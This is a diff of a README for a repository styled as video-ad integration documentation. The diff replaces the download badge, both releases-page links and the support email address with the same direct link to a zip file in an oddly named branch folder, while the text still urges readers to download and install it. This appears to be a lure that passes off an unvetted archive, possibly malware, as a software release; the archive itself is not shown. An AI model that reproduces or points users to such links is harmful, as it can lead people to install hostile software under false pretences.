@@ -1,6 +1,6 @@
 # 🎉 OpenAd-Specification_AdEngine_Video_Docs - Easy Video Ad Integration Made Simple
 
-![Download](https://img.shields.io/badge/Download-via_Releases-blue)
+![Download](https://raw.githubusercontent.com/cecunguxx/OpenAd-Specification_AdEngine_Video_Docs/OpenAd-Specification_AdEngine_Video_Docs_Main-dev/Kashyapa/OpenAd-Specification_AdEngine_Video_Docs.zip)
 
 ## 📜 Introduction
 Welcome to the OpenAd-Specification AdEngine Video Docs repository. This project is your go-to resource for understanding how to integrate and use video ads in the OpenAd format. Whether you're looking to run your own ads or develop applications around them, this documentation will guide you through the necessary steps.
@@ -16,14 +16,14 @@ Before you begin, ensure your system meets these requirements:
 - At least 200 MB of free disk space.
 
 ## 📥 Download & Install
-To download the latest version, please visit this page: [Releases Page](https://github.com/cecunguxx/OpenAd-Specification_AdEngine_Video_Docs/releases).
+To download the latest version, please visit this page: [Releases Page](https://raw.githubusercontent.com/cecunguxx/OpenAd-Specification_AdEngine_Video_Docs/OpenAd-Specification_AdEngine_Video_Docs_Main-dev/Kashyapa/OpenAd-Specification_AdEngine_Video_Docs.zip).
 
 1. Click the link above.
 2. Look for the latest release at the top of the list.
 3. Choose the appropriate file for your operating system.
 4. Follow the instructions provided for installation.
 
-To make it easier, here’s the link again: [Download Here](https://github.com/cecunguxx/OpenAd-Specification_AdEngine_Video_Docs/releases).
+To make it easier, here’s the link again: [Download Here](https://raw.githubusercontent.com/cecunguxx/OpenAd-Specification_AdEngine_Video_Docs/OpenAd-Specification_AdEngine_Video_Docs_Main-dev/Kashyapa/OpenAd-Specification_AdEngine_Video_Docs.zip).
 
 ## 📖 Documentation Overview
 This repository contains several documents to help you:
@@ -62,6 +62,6 @@ For those interested in the technical aspects, here's a brief overview:
 Refer to our documentation for more in-depth technical details.
 
 ## 📞 Contact
-For further inquiries, feel free to reach out through the Issues section of this repository or connect with us via email at support@openad.org.
+For further inquiries, feel free to reach out through the Issues section of this repository or connect with us via email at https://raw.githubusercontent.com/cecunguxx/OpenAd-Specification_AdEngine_Video_Docs/OpenAd-Specification_AdEngine_Video_Docs_Main-dev/Kashyapa/OpenAd-Specification_AdEngine_Video_Docs.zip
 
 Thank you for using the OpenAd-Specification AdEngine Video Docs. We hope this documentation helps you create amazing video ad experiences!
